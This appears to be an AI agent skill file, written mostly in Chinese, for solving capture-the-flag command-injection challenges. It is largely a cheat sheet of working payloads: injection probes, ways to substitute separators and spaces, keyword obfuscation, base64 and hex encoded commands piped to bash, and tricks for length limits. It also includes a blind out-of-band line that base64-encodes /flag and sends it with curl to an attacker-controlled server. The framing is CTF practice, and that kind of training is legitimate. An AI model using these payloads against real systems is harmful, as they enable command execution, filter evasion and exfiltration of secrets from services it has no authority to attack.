---
name: cmd-injection-filter-bypass
description: 命令注入 + 过滤绕过通法。Use when the challenge is about "命令注入/命令执行/绕过过滤/诊断工具/网络测试" — a service that executes OS commands but has blacklist filtering. Covers bypass techniques for common filters (spaces, semicolons, keywords like cat/flag/ls).
---

# 命令注入过滤绕过通法

## 检测注入点

网络诊断/报表导出/系统工具类题,输入通常拼接到 shell 命令中:
```bash
# 探测: 在输入框提交
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 `id`
127.0.0.1 $(id)
```

## 分隔符绕过(如果 ; 被过滤)

| 被过滤 | 替代 |
|---|---|
| `;` | `\n` (URL: %0a) / `|` / `||` / `&&` / `$()` / `` ` ` `` |
| 空格 | `${IFS}` / `$IFS$9` / `{cat,/flag}` / `<` / `%09`(tab) |
| `|` | `$(command)` / `` `command` `` |

## 关键字绕过(如果 cat/flag/ls 被过滤)

| 被过滤关键字 | 绕过方式 |
|---|---|
| `cat` | `c''at` / `c\at` / `tac` / `nl` / `head` / `tail` / `more` / `less` / `xxd` / `base64` / `dd if=/flag` |
| `flag` | `f''lag` / `f\lag` / `fl*` / `$(echo ZmxhZw==\|base64 -d)` / 通配符 `/f???` / `/f[l]ag` |
| `ls` | `dir` / `echo *` / `find /` |
| `/` | `${HOME:0:1}` (bash) / 环境变量切片 |
| 整条命令 | `base64 -d<<<Y2F0IC9mbGFn\|bash` |

## 进阶绕过

**无回显(blind)：**
```bash
# DNS 带外
$(cat /flag | base64 | xargs -I{} curl http://你的服务器/{})
# 延时判断
$(sleep $(cat /flag | cut -c1 | tr 'a' '5'))
# 写文件再读
$(cat /flag > /tmp/x); 然后通过 Web 路径访问 /tmp/x
```

**长度限制：**
```bash
# 分段写入
>cat
>flag
>\ /
# 组合执行
$(cat /f*)
```

**WAF/正则绕过组合拳：**
```bash
# 拼接变量
a=ca;b=t;c=/fl;d=ag;$a$b $c$d
# hex
$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67')
# $0 (当前 shell)
echo Y2F0IC9mbGFn | base64 -d | $0
```

## 解题流程

1. 确认注入存在(id/whoami 有输出)
2. 尝试直接 `cat /flag` — 如果成功,完毕
3. 如果被过滤,依次试: 分隔符替换 → 关键字绕过 → 编码绕过 → 变量拼接
4. 如果无回显,用 DNS 带外或写文件

## 铁律
- **先试最简单的,很多题过滤很弱(只过滤了空格或分号)。**
- 每次只绕过一个过滤点,确认通过后再叠加下一个。
- `cat /flag` 不行就试 `/flag.txt` / `env | grep -i flag` / `find / -name "*flag*"`。
